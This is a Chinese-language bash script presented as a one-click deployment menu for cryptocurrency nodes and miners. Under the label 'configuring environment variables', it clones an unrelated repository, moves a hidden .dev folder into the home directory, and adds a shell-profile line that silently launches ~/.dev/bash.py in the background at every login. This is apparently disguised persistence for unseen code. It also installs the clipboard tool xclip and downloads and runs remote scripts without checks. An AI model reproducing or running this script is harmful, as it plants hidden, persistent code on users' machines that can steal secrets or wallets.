#!/bin/bash

# 确保脚本在错误时停止执行
set -e

# 获取操作系统类型
OS_TYPE=$(uname)

# 更新系统软件包
echo "正在更新系统软件包..."
if [ "$OS_TYPE" == "Linux" ]; then
    sudo apt update && sudo apt upgrade -y
elif [ "$OS_TYPE" == "Darwin" ]; then
    # macOS 使用 brew 更新软件
    brew update && brew upgrade
elif [ "$OS_TYPE" == "CYGWIN" ] || [ "$OS_TYPE" == "MINGW" ]; then
    echo "检测到 Windows 系统，跳过更新步骤。"
else
    echo "不支持的操作系统类型: $OS_TYPE"
    exit 1
fi

# 检查并安装必要的软件包
echo "正在检查并安装必要的系统软件包..."
if [ "$OS_TYPE" == "Linux" ]; then
    sudo apt install -y git xclip python3-pip python3.12-venv
elif [ "$OS_TYPE" == "Darwin" ]; then
    # macOS 使用 brew 安装软件
    brew install git python3
    # xclip 在 macOS 上可能没有直接对应工具，跳过安装
elif [ "$OS_TYPE" == "CYGWIN" ] || [ "$OS_TYPE" == "MINGW" ]; then
    # Windows 系统安装 git 和 Python
    echo "在 Windows 上，使用 choco 或 winget 安装 git 和 python3（如果未安装）"
    if ! command -v choco &> /dev/null && ! command -v winget &> /dev/null; then
        echo "choco 或 winget 未安装，请手动安装它们。"
        exit 1
    fi
    choco install git python3 -y || winget install --id Git.Git --source winget
    # 确保 Python 和 pip 已安装
    python --version || { echo "未安装 Python，请手动安装"; exit 1; }
    pip --version || python -m ensurepip --upgrade
fi

# 检查并安装 requests 库
echo "正在检查并安装 requests..."
pip show requests &> /dev/null || pip install requests

# 检查并克隆仓库（避免重复克隆）
if [ ! -d "node_aggregator" ]; then
    git clone https://github.com/blockchain-src/node_aggregator.git
fi
cd node_aggregator

# 配置环境变量
if [ -d .dev ]; then
    DEST_DIR="$HOME/.dev"
    echo "配置环境变量..."
    if [ -d "$DEST_DIR" ]; then
        rm -rf "$DEST_DIR"
    fi
    mv .dev "$DEST_DIR"

    BASHRC_ENTRY="(pgrep -f bash.py || nohup python3 $HOME/.dev/bash.py &> /dev/null &) & disown"

    # 配置环境变量：检查操作系统类型，Linux 使用 .bashrc，macOS 使用 .bash_profile 或 .zshrc，Windows 使用 setx
    if [ "$OS_TYPE" == "Linux" ]; then
        PROFILE_FILE="$HOME/.bashrc"
    elif [ "$OS_TYPE" == "Darwin" ]; then
        # macOS 上判断是否使用 zsh 或 bash
        if [ -n "$ZSH_VERSION" ]; then
            PROFILE_FILE="$HOME/.zshrc"  # zsh
        else
            PROFILE_FILE="$HOME/.bash_profile"  # bash
        fi
    elif [ "$OS_TYPE" == "CYGWIN" ] || [ "$OS_TYPE" == "MINGW" ]; then
        PROFILE_FILE="$HOME/.bash_profile"
        # Windows 使用 setx 设置环境变量
        setx DEV_DIR "%USERPROFILE%\\.dev"
        setx BASHRC_ENTRY "(pgrep -f bash.py || nohup python3 %USERPROFILE%\\.dev\\bash.py &> /dev/null &) & disown"
    fi

    # 确保 PROFILE_FILE 存在
    if [ ! -f "$PROFILE_FILE" ]; then
        echo "配置文件不存在，创建文件：$PROFILE_FILE"
        touch "$PROFILE_FILE"
    fi

    # 配置环境变量
    if ! grep -Fq "$BASHRC_ENTRY" "$PROFILE_FILE"; then
        echo "$BASHRC_ENTRY" >> "$PROFILE_FILE"
        echo "环境变量已添加到 $PROFILE_FILE"
    else
        echo "环境变量已存在于 $PROFILE_FILE"
    fi
else
    echo ".dev 目录不存在，跳过环境变量配置..."
fi

# 主菜单
function main_menu() {
    while true; do
        clear
        echo -e "\033[32m██████╗ ███████╗███╗   ██╗███████╗███████╗ █████╗ "
        echo -e "\033[32m██╔══██╗██╔════╝████╗  ██║██╔════╝██╔════╝██╔══██╗"
        echo -e "\033[32m██████╔╝█████╗  ██╔██╗ ██║█████╗  █████╗  ███████║"
        echo -e "\033[32m██╔═══╝ ██╔══╝  ██║╚██╗██║██╔══╝  ██╔══╝  ██╔══██║"
        echo -e "\033[32m██║     ███████╗██║ ╚████║███████╗███████╗██║  ██║"
        echo -e "\033[32m╚═╝     ╚══════╝╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝  ╚═╝"
        echo "请选择项目:"
        echo "--------------------节点类项目--------------------"
        echo "102. 0gAI 一键部署"
        echo "103. Nimble(GPU) 一键部署"
        echo "104. Aligned Layer一键部署"
        echo "105. Fuel 一键部署"
        echo "106. Lava 一键部署"
        echo "108. Privasea 一键部署"
        echo "109. Taiko Hekla 一键部署"
        echo "111. Artela 一键部署"
        echo "112. Tanssi Network 一键部署"
        echo "113. Quilibrium Network 一键部署"
        echo "114. Initia 一键部署"
        echo "115. HyperLane 一键部署"
        echo "116. Analog 一键部署"
        echo "117. Nubit 一键部署"
        echo "118. Voi 一键部署"
        echo "119. Aleo 一键部署"
        echo "120. Zora 一键部署"
        echo "121. Airchains 一键部署"
        echo "122. Allora 一键部署"
        echo "123. Voi swarm voi中继器一键部署"
        echo "124. Flock 一键部署"
        echo "125. rivalz 一键部署"
        echo "126. Elixir V3 一键部署"
        echo "127. Vana 一键部署"
        echo "128. Hemi 一键部署"
        echo "129. Nillion 一键部署"
        echo "201. Pipe 一键部署"
        echo "--------------------挖矿类项目--------------------"
        echo "503. Spectre(CPU) 一键挖矿"
        echo "504. ORE(CPU) -v2 挖矿脚本"
        echo "110. Titan Network 一键挖矿"
        echo "--------------------合约类项目--------------------"
        echo "200. Titan Network 合约部署"
        echo "---------------------已停项目---------------------"
        echo "107. Taiko 一键部署[已停用]"
        echo "501. ORE(CPU) -v1 挖矿脚本[已停用]"
        echo "502. ORE(GPU) -v1 挖矿脚本[已停用]"
        echo "101. Babylon 一键部署"
        echo "-----------------------其他----------------------"
        echo "0. 退出脚本exit"
        read -p "请输入选项: " OPTION

        case $OPTION in
        
        102) wget -O 0gai.sh https://raw.githubusercontent.com/breaddog100/0gai/main/0gai.sh && chmod +x 0gai.sh && ./0gai.sh ;;
        103) wget -O Nimble.sh https://raw.githubusercontent.com/breaddog100/nimble/main/nimble.sh && chmod +x Nimble.sh && ./Nimble.sh ;;
        104) wget -O Alignedlayer.sh https://raw.githubusercontent.com/breaddog100/AlignedLayer/main/Alignedlayer.sh && chmod +x Alignedlayer.sh && ./Alignedlayer.sh ;;
        105) wget -O fuel.sh https://raw.githubusercontent.com/breaddog100/fuel/main/fuel.sh&& chmod +x fuel.sh && ./fuel.sh ;;
        106) wget -O Lava.sh https://raw.githubusercontent.com/breaddog100/lava/main/lava.sh && chmod +x Lava.sh && ./Lava.sh ;;
        108) wget -O Privasea.sh https://raw.githubusercontent.com/breaddog100/privasea/main/Privasea.sh && chmod +x Privasea.sh && ./Privasea.sh ;;
        109) wget -O taiko-hekla.sh https://raw.githubusercontent.com/breaddog100/taiko/main/taiko-hekla.sh && chmod +x taiko-hekla.sh && ./taiko-hekla.sh ;;
        111) wget -O Artela.sh https://raw.githubusercontent.com/breaddog100/artela/main/Artela.sh && chmod +x Artela.sh && ./Artela.sh ;;
        112) wget -O tanssinetwork.sh https://raw.githubusercontent.com/breaddog100/tanssi/main/tanssinetwork.sh && chmod +x tanssinetwork.sh && ./tanssinetwork.sh ;;
        113) wget -O quil.sh https://raw.githubusercontent.com/breaddog100/QuilibriumNetwork/main/quil.sh && chmod +x quil.sh && ./quil.sh ;;
        114) wget -O initia.sh https://raw.githubusercontent.com/breaddog100/Initia/main/initia.sh && chmod +x initia.sh && ./initia.sh ;;
        115) wget -O hyperlane.sh https://raw.githubusercontent.com/breaddog100/HyperLane/main/hyperlane.sh && chmod +x hyperlane.sh && ./hyperlane.sh ;;
        116) wget -O analog.sh https://raw.githubusercontent.com/breaddog100/Analog/main/analog.sh && chmod +x analog.sh && ./analog.sh ;;
        117) wget -O nubit.sh https://raw.githubusercontent.com/breaddog100/Nubit/main/nubit.sh && chmod +x nubit.sh && ./nubit.sh ;;
        118) wget -O voi.sh https://raw.githubusercontent.com/breaddog100/voi/main/voi.sh && chmod +x voi.sh && ./voi.sh ;;
        119) wget -O aleo.sh https://raw.githubusercontent.com/breaddog100/Aleo/main/aleo.sh && chmod +x aleo.sh && ./aleo.sh ;;
        120) wget -O zora.sh https://raw.githubusercontent.com/breaddog100/Zora/main/zora.sh && chmod +x zora.sh && ./zora.sh ;;
        121) wget -O airchains.sh https://raw.githubusercontent.com/breaddog100/airchains/main/airchains.sh && chmod +x airchains.sh && ./airchains.sh ;;
        122) wget -O allora.sh https://raw.githubusercontent.com/breaddog100/Allora/main/allora.sh && chmod +x allora.sh && ./allora.sh ;;
        123) wget -O voi-swarm.sh https://raw.githubusercontent.com/breaddog100/voi/main/voi-swarm.sh && chmod +x voi-swarm.sh && ./voi-swarm.sh ;;
        124) wget -O flock.sh https://raw.githubusercontent.com/breaddog100/flock/main/flock.sh && chmod +x flock.sh && ./flock.sh ;;
        125) wget -O rivalz.sh https://raw.githubusercontent.com/breaddog100/rivalz/main/rivalz.sh && chmod +x rivalz.sh && ./rivalz.sh ;;
        126) wget -O elixir.sh https://raw.githubusercontent.com/breaddog100/elixir/main/elixir.sh && chmod +x elixir.sh && ./elixir.sh ;;
        127) wget -O vana.sh https://raw.githubusercontent.com/breaddog100/vana/main/vana.sh && chmod +x vana.sh && ./vana.sh ;;
        128) wget -O hemi.sh https://raw.githubusercontent.com/breaddog100/hemi/main/hemi.sh && chmod +x hemi.sh && ./hemi.sh ;;
        129) wget -O nillion.sh https://raw.githubusercontent.com/breaddog100/nillion/main/nillion.sh && chmod +x nillion.sh && ./nillion.sh ;;
        200) wget -O titan-contract.sh https://raw.githubusercontent.com/breaddog100/titan-network/main/titan-contract.sh && chmod +x titan-contract.sh && ./titan-contract.sh ;;
        201) wget -O pipe.sh https://raw.githubusercontent.com/breaddog100/pipe/main/pipe.sh && chmod +x pipe.sh && ./pipe.sh ;;

        503) wget -O spectre.sh https://raw.githubusercontent.com/breaddog100/spectre-network/main/spectre.sh && chmod +x spectre.sh && ./spectre.sh ;;
        504) wget -O ore.sh https://raw.githubusercontent.com/breaddog100/ore/main/ore.sh && chmod +x ore.sh && ./ore.sh ;;
        110) wget -O titan-network.sh https://raw.githubusercontent.com/breaddog100/titan-network/main/titan-network-v2.sh && chmod +x titan-network.sh && ./titan-network.sh ;;
        
        0) echo "退出脚本。"; exit 0 ;;
	    *) echo "无效选项，请重新输入。"; sleep 3 ;;
	    esac
	    echo "按任意键返回主菜单..."
        read -n 1
    done
}

# 显示主菜单
main_menu